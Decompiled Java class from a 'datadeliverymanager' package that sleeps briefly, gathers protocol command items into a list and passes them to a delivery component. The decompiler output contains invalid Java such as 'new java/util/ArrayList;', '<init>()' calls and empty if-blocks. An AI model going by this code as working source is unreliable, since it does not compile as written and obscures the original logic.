package com.vvt.datadeliverymanager;

import android.os.SystemClock;
import com.vvt.datadeliverymanager.a.b;
import com.vvt.phoenix.prot.command.a.q;
import com.vvt.phoenix.prot.command.a.s;
import java.util.ArrayList;
import java.util.List;

class n
  implements Runnable
{
  n(m paramm, s params) {}
  
  public void run()
  {
    int i = k.d();
    if (i != 0) {}
    long l = 1000L;
    SystemClock.sleep(l);
    s locals = this.a;
    int k = locals.g();
    i = k.f();
    if (i != 0) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    i = 0;
    locals = null;
    while (i < k)
    {
      q localq = this.a.d(i);
      localArrayList.add(localq);
      int j;
      i += 1;
    }
    k.h(this.b.a).a(localArrayList);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/n.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */